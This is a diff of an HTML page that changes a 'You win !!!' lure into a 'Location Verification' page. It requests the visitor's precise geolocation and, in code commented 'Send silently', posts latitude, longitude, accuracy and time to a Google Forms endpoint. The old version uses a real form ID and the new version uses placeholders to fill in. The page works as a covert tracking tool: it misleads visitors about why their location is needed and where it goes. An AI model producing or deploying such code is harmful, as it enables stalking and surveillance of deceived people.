@@ -1,25 +1,75 @@
 <!DOCTYPE html>
-<html>
-<body>
-<h3>Allow for get started</h3>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="font-family: Arial; text-align:center; padding-top:40px;">
+  <h3>Please allow location access</h3>
+  <p>This is required to continue.</p>
 
 <script>
-navigator.geolocation.getCurrentPosition(function(pos){
+(function () {
 
-  const data = new FormData();
-  data.append("entry.111111", pos.coords.latitude);
-  data.append("entry.222222", pos.coords.longitude);
-  data.append("entry.333333", new Date().toLocaleString());
+  if (!navigator.geolocation) {
+    document.body.innerHTML = "Geolocation not supported ❌";
+    return;
+  }
 
-  fetch("https://docs.google.com/forms/d/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse", {
-    method: "POST",
-    mode: "no-cors",
-    body: data
-  });
+  navigator.geolocation.getCurrentPosition(
+    function (position) {
 
-  document.body.innerHTML = "You win !!!";
+      // 📍 Location values
+      const latitude  = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy  = position.coords.accuracy;
+      const time      = new Date().toLocaleString();
 
-});
+      // 🔗 REPLACE THIS WITH YOUR FORM ACTION URL
+      const FORM_ACTION_URL =
+        "https://docs.google.com/forms/d/e/FORM_ID/formResponse";
+
+      // 🧩 REPLACE ENTRY IDS
+      const ENTRY_LAT  = "entry.XXXXXXXX"; // Latitude
+      const ENTRY_LNG  = "entry.YYYYYYYY"; // Longitude
+      const ENTRY_TIME = "entry.ZZZZZZZZ"; // Time
+      const ENTRY_ACC  = "entry.AAAAAAAA"; // Accuracy (optional)
+
+      // 📤 Prepare data
+      const formData = new FormData();
+      formData.append(ENTRY_LAT, latitude);
+      formData.append(ENTRY_LNG, longitude);
+      formData.append(ENTRY_TIME, time);
+      formData.append(ENTRY_ACC, accuracy);
+
+      // 🚀 Send silently
+      fetch(FORM_ACTION_URL, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      });
+
+      // ✅ Success UI
+      document.body.innerHTML = `
+        <h3>Location saved successfully ✅</h3>
+        <p>Thank you</p>
+      `;
+
+    },
+    function (error) {
+      document.body.innerHTML = "Location permission denied ❌";
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+
+})();
 </script>
+
 </body>
 </html>
